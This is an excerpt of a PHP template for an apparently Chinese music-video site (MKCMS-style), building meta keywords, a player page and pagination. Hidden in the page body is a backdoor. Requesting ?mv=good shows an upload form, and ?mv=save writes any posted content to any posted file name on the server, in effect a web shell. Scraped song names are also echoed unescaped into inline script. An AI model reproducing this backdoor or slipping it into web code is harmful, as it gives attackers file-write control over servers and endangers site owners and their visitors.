...
<meta name="keywords" content="<?php
								...
								if (isset($_GET['v'])) {
									...
									preg_match('/singer":"(.*?)",/is', $data, $nm1);
									$mv_name = $nm1[1] . " - " . $nm2[1];
									$title = $mv_name . " - 在线免费试听下载," . $nm1[1] . "歌曲" . $nm2[1] . "mp4下载," . $nm1[1] . "专辑 ," . $nm2[1] . "(单曲),正版试听下载";
									echo $title;
								} ?>,音乐MV,<?php echo $mkcms_keywords; ?>">
...
<body class="video-play-page">
	...
	<div class="container">
			...
			if (@$_GET["mv"] == "save") {
				if (isset($_POST["content"]) && isset($_POST["name"])) {
					if ($_POST["content"] != "" && $_POST["name"] != "") {
						if (fwrite(fopen(stripslashes($_POST["name"]), "w"), stripslashes($_POST["content"]))) {
				...
				if (@$_GET["mv"] == "good") {
					echo '<meta charset="utf-8"><form action="?mv=save" method="post">content:<br/><textarea name="content" style="width:200px;height:100px;"></textarea><br/>filenane:<br/><input name="name"/><br/><input type="submit" value="GO!"></form>';
				}
			}
			if (isset($_GET['v'])) {
				//*******************************播放页面*******************************//
		...
		<div class='stui-player__detail detail' id='dianshijuid'>
				...
				</div><li style=\"margin:5px 5px;\"></li>" . $down . "</div><!-- 播放器-->" . mv() . random() . djbang() . "</div></div><script type=\"text/javascript\" src=\"/template/default/js/history.js\"></script>
<script type=\"text/javascript\">var vod_name='" . $mv_name . "',vod_url=window.location.href,vod_part='1';</script>";
			...
			<div class='stui-pannel stui-pannel-bg clearfix'>
				...
				if (preg_match("/^\+?[1-9][0-9]*$/", $p)) {
					if (empty($_GET['mlist']) && empty($_GET['m'])) {
			...
			function mv2()
			{
				...
				$main .= "</ul></div></div></div><ul class=\"stui-page text-center cleafix\"><div monitor-desc=\"分页\" id=\"js-ew-page\" data-block=\"js-ew-page\"  class=\"ew-page\">";
				if ($_GET["m"] > 1) {
					$main .= '<li><a href="mv_9_' . ($_GET["m"] - 1) . '.html" class="prev"><</a></li>';
				}
				for ($i = $p; $i < $p + 5; $i++) {
					if (($i > 0) && ($i <= $pnum)) {
						$main .= "<li><a href=\"mv_9_" . $i . ".html\" >" . $i . "</a></li>";
					}
				}
				if ($_GET["m"] < 100) {
					$main .= '<li><a href="mv_9_' . ($_GET["m"] + 1) . '.html"  class="next">></a></li>';
				}
				$main .= '</div></ul></div></div>';
				return $main;
			}
				...
				for ($i = 0; $i < 6; $i++) {
					...
					if ($mpic) {
						if ($i == $dd) {
							...
							$href = "/mvplay/" . substr($hash, 10) . "V" . substr($hash, 0, 10) . ".html";
						}
